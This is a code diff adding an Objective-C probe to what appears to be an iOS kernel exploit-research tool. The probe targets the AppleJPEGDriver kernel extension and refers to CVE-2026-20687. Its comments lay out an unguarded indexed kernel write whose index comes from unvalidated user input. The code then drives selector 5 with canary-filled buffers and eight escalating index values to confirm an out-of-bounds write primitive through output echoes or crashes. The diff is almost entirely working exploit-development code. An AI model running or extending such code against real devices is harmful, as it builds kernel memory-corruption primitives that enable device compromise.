@@ -1228,6 +1228,103 @@ NSString *ModJpegIdxProbe(void) {
               accepted, LO, HI);
 }
 
+// The decisive experiment for the primitive candidate.
+//
+// Established facts:
+//   * the ONLY unguarded indexed write in the kext is
+//       kext+0x174c   str  w22, [x9, w15, uxtw]
+//     with w15 = obj->0xcc;
+//   * obj+0xcc is a verbatim copy of x1+0x178 (an unvalidated 14-word bulk copy
+//     at kext+0x24ff0 that maps x1+0x158..0x180 -> obj+0xac..0xd4);
+//   * the index probe just PROVED that slots +0x148..+0x188 of the 0x1000 input
+//     struct are all accepted by sel5 with kr=0 - including +0x178 itself.
+//
+// So: set +0x178 (and the whole copy window) to controlled values and look for
+// an effect.  A large index must either (a) land in the 4096-byte output as a
+// read-back echo, or (b) crash with a computed fault address = an out-of-bounds
+// write.  Each variant is written to the panic marker BEFORE the call.
+NSString *ModJpegIdxWrite(void) {
+    AveLog(@"[idxwrite] === does +0x178 (the index of the unguarded write) do anything? ===");
+    io_service_t svc = rs_jpeg_service();
+    if (!svc) return @"AppleJPEGDriver: service not found";
+
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+    if (kr != KERN_SUCCESS || !conn) { IOObjectRelease(svc); return @"userclient not openable"; }
+
+    mach_port_t notify = MACH_PORT_NULL;
+    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notify) == KERN_SUCCESS)
+        mach_port_insert_right(mach_task_self(), notify, notify, MACH_MSG_TYPE_MAKE_SEND);
+    IOConnectSetNotificationPort(conn, 0, notify, 0);
+
+    const uint32_t W = 2048, H = 2048;
+    UIGraphicsBeginImageContext(CGSizeMake(W, H));
+    [[UIColor redColor] setFill];
+    UIRectFill(CGRectMake(0, 0, W, H));
+    UIImage *img = UIGraphicsGetImageFromCurrentImageContext();
+    UIGraphicsEndImageContext();
+    NSData *jpeg = UIImageJPEGRepresentation(img, 0.9);
+    size_t allocLen = jpeg ? ((jpeg.length + 0x3FFF) & ~(size_t)0x3FFF) : 0x1000;
+    NSDictionary *sp = @{(id)kIOSurfaceWidth: @(allocLen), (id)kIOSurfaceHeight: @1,
+                         (id)kIOSurfaceBytesPerElement: @1, (id)kIOSurfacePixelFormat: @0x20202020};
+    IOSurfaceRef_ src = IOSurfaceCreate((__bridge CFDictionaryRef)sp);
+    NSDictionary *dp = @{(id)kIOSurfaceWidth: @(W), (id)kIOSurfaceHeight: @(H),
+                         (id)kIOSurfaceBytesPerElement: @4, (id)kIOSurfacePixelFormat: @0x42475241};
+    IOSurfaceRef_ dst = IOSurfaceCreate((__bridge CFDictionaryRef)dp);
+    if (!jpeg || !src || !dst) {
+        if (src) CFRelease(src);
+        if (dst) CFRelease(dst);
+        IOServiceClose(conn); IOObjectRelease(svc);
+        return @"surface/jpeg setup failed";
+    }
+    IOSurfaceLock(src, 0, NULL);
+    memcpy(IOSurfaceGetBaseAddress(src), jpeg.bytes, jpeg.length);
+    IOSurfaceUnlock(src, 0, NULL);
+    uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);
+
+    // The index candidates.  A small value should be harmless; a large one must
+    // either echo into the output or fault.
+    const uint32_t idxs[8] = {0, 4, 0x40, 0x400, 0x1000, 0x10000, 0x100000, 0x7ffffff0u};
+    for (int v = 0; v < 8; v++) {
+        uint8_t *big = (uint8_t *)malloc(0x1000);
+        uint8_t *bigo = (uint8_t *)malloc(0x1000);
+        if (!big || !bigo) { free(big); free(bigo); break; }
+        memset(big, 0, 0x1000);
+        memset(bigo, 0, 0x1000);
+        rs_jm_fill((RSJpegIn *)big, srcID, dstID, W, H, 0, 0x6161);
+        // fill the whole bulk-copy window (+0x158..+0x180) with a canary so any
+        // echo is unmistakable
+        for (uint32_t k = 0x158; k < 0x184; k += 4) {
+            uint32_t c = 0xC0FF0000u | k;
+            memcpy(big + k, &c, 4);
+        }
+        // then set the index slot (+0x178) to the candidate
+        memcpy(big + 0x178, &idxs[v], 4);
+        size_t osz = 0x1000;
+        rs_jm_markSel(5, 300 + v);
+        kern_return_t k = IOConnectCallStructMethod(conn, 5, big, 0x1000, bigo, &osz);
+        AveLog(S(@"[idxwrite] idx +0x178=%#010x -> kr=%#x outSize=%zu", idxs[v], k, osz));
+        if (k == KERN_SUCCESS && osz > 0) {
+            int nz = 0;
+            for (uint32_t q = 0; q < 0x1000; q++)
+                if (bigo[q] != 0) { nz = 1; break; }
+            if (nz) {
+                AveLog(S(@"[idxwrite] *** NON-ZERO OUTPUT for idx=%#x ***", idxs[v]));
+                rs_jm_dump(S(@"idxwrite out idx=%#x", idxs[v]), bigo, osz);
+            }
+        }
+        free(big);
+        free(bigo);
+        rs_jm_drain(notify, S(@"idxwrite %#x", idxs[v]));
+    }
+
+    IOServiceClose(conn);
+    CFRelease(src); CFRelease(dst);
+    IOObjectRelease(svc);
+    AveSetStatus(@"index write probe done - see the log");
+    return @"index write probe done: 8 index values tried on +0x178; look for a non-zero output or a crash";
+}
+
 NSString *ModJpegMethods(void) {
     AveLog(@"[jpegmethods] === CVE-2026-20687 selector audit (hidgate-poc jpegmethods2 port) ===");
     io_service_t svc = rs_jpeg_service();
